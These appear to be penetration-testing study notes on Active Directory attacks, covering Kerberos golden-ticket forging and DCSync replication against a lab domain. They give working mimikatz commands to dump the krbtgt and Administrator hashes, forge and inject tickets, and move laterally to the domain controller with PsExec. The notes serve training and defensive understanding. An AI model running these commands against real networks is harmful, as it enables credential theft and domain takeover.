GOLDEN TICKETS
--------------
KDC encrypts TGT with its secret key. This secret key is password hash of a domain user account called krbtgt. If we can obtain 
krbtgt password hash, we can create a self-made TGT, also known as golden tickets.

Go to DC as admin user and obtain krbtgt hash using mimikatz.
mimikatz# privilege::debug
mimikatz# lsadump::lsa /patch

Go to windows 10 client machine and try to move laterally to DC via PsExec as regular user
> psexec.exe \\dc.hacker.testlab cmd.exe
Access Denied
// obtain SID. Exclude the user part. Example for S-1-5-21-511870593-2731438996-3089629929-500 then exclude 500
> whoami /user
// Open mimikatz and delete existing tickets. Create a new TGT for fakeuser using krbtgt hash and SID
mimikatz# kerberos::purge
mimikatz# kerberos::golden /user:fakeuser /domain:hacker.testlab /sid:<> /krbtgt:<> /ptt
// Once golden ticket is injected into memory, launch cmd.exe
mimikatz# misc::cmd
> psexec.exe \\dc cmd.exe
> whoami 
fake user
> whoami /groups
Member of powerful groups like domain admin, enterprise admin etc.

If we were to use IP instead of domain name, we would get access denied because it forces NTLM auth
> psexec.exe \\172.16.169.200 cmd.exe
Access Denied

We used kerberos ticket to get to DC and bypassed NTLM authentication. Hence, it is also a kind of Overpass the hash.

DOMAIN CONTROL SYNCHRONIZATION
------------------------------
NTDS.dit  -  database file used to store password hash of every user similar to SAM db used for local accounts
Difficult to steal NTDS.dir since it requires tool to be uploaded to DC and might leave trail.

In enterprise there are more than 1 dc to provide redundancy 
The directory replication service Remote Protocol uses replication to sync these redundant DC.
A DC may request an update for specific object like account with IDL_DRSGenNCChanges API

DC receiving a request for an update does not verify that request came from known DC, only checks that SID has appropriate privileges.
If we issue request to DC from user who is member of Domains Admins group, it will succeed.

mimikatz # lsadump::dcsync /user:Administrator
